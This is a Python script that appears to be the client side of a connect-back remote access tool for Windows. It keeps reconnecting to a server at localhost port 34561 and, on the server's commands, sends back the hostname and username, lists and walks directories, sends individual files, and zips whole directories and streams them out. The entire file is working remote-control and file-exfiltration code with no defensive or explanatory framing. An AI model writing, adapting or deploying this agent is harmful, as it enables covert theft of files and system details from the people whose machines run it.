import os
import shutil
import time
from pathlib import Path
from socket import *

server_name = 'localhost'
server_port = 34561
current_path = Path.home()


def hostname():
    print('Hostname requested')
    host = gethostname()
    clientSocket.send(host.encode())


def user_logged():
    print('Username requested')
    username = os.getlogin()
    clientSocket.send(username.encode())


def ls():
    print('List directory requested')
    list_dir = os.walk(current_path)
    for root, dirs, files in list_dir:
        for dir in dirs:
            clientSocket.send(dir.encode())
            time.sleep(0.1)

        clientSocket.send('/'.encode())

        for file in files:
            clientSocket.send(file.encode())
            time.sleep(0.1)

        clientSocket.send('.'.encode())
        break


# def cd():
#     global current_path
#     print('Change path requested')
#     path = clientSocket.recv(1024).decode()
#     try:
#         os.chdir(path)
#         current_path = path
#         clientSocket.send(current_path.encode())
#     except FileNotFoundError:
#         print('Path not found')
#         clientSocket.send('Path not found'.encode())


def cdup():
    print('Change to parent directory requested')
    global current_path
    current_path = str(Path(current_path).parent)
    clientSocket.send(current_path.encode())


def cdhome():
    global current_path
    print('Change directory to home requested')
    current_path = Path.home()
    clientSocket.send(str(current_path).encode())


def cdroot():
    global current_path
    print('Change directory to root requested')
    current_path = Path('C:\\')
    clientSocket.send(str(current_path).encode())


def join():
    global current_path
    print('Join directory requested')
    path = clientSocket.recv(1024).decode()
    try:
        current_path = str(current_path) + '\\' + path
        os.chdir(current_path)
        clientSocket.send(current_path.encode())
    except FileNotFoundError:
        print('Path not found')
        clientSocket.send('Path not found'.encode())


def pwd():
    print('Working directory requested')
    clientSocket.send(str(current_path).encode())


def get():
    print('Get file requested')
    file_name = clientSocket.recv(1024).decode()
    print('Downloading file ' + file_name)
    try:
        file = open(file_name, 'rb')
        file_data = file.read(1024)
        clientSocket.send(file_data)
        while file_data:
            file_data = file.read(1024)
            clientSocket.send(file_data)
        file.close()
    except FileNotFoundError:
        print('File not found')
        clientSocket.send('File not found'.encode())


def getall():
    shutil.make_archive(str(Path.home()) + '\\files', 'zip', current_path)
    print('Get all files requested')
    try:
        file = open(str(Path.home()) + '\\files.zip', 'rb')
        file_data = file.read(1024)
        clientSocket.send(file_data)
        while file_data:
            file_data = file.read(1024)
            clientSocket.send(file_data)
        file.close()
    except FileNotFoundError:
        print('File not found')
        clientSocket.send('File not found'.encode())
    os.remove(str(Path.home()) + '\\files.zip')


switcher = {
    'hostname': hostname,
    'user': user_logged,
    'ls': ls,
    'pwd': pwd,
    'get': get,
    'getall': getall,
    'cdup': cdup,
    'cdhome': cdhome,
    'cdroot': cdroot,
    'join': join}

connected = False
while True:

    while not connected:
        try:
            clientSocket = socket(AF_INET, SOCK_STREAM)
            clientSocket.connect((server_name, server_port))
            connected = True
            print("re-connection successful")

        except ConnectionRefusedError:
            print('Server not available')
            connected = False
            # wait 5 seconds
            time.sleep(10)

    while connected:
        try:
            command = clientSocket.recv(1024).decode()
            if command in switcher.keys() and command != '':
                print('Command received: ', command)
                switcher[command]()
        except ConnectionError:
            print('Server disconnected')
            # wait 5 seconds
            clientSocket.shutdown(SHUT_RDWR)
            clientSocket.close()
            connected = False
            time.sleep(10)
            os.system('cls')
